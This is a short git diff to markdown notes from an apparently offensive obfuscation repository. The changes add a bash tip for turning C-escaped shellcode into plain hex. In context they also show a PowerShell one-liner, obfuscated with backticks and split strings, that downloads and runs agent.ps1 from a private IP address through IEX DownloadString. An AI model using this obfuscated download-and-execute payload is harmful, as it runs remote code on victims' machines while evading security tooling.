@@ -37,6 +37,16 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 ## bash
 
+- encoding shellcode in C to ANCII
+
+      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode
+
+      8b5a00270d0a <-- ANCII
+
+
+- parsing shellcode data
+
+      cat shellcode.txt | tr -d '\\' | tr -d 'x'
 
 ---
 
@@ -61,7 +71,7 @@ The above string can be obfuscated using **powershell escape caracters** ` and +
 - string obfuscated<br />
 
       $get = New-Object "N`et`Web`Cl`ie`nt"
-      p`owe`r`she`l`l.exe IEX ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')<br />
+      p`owe`r`she`l`l.exe IEX ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
 
 ---
 
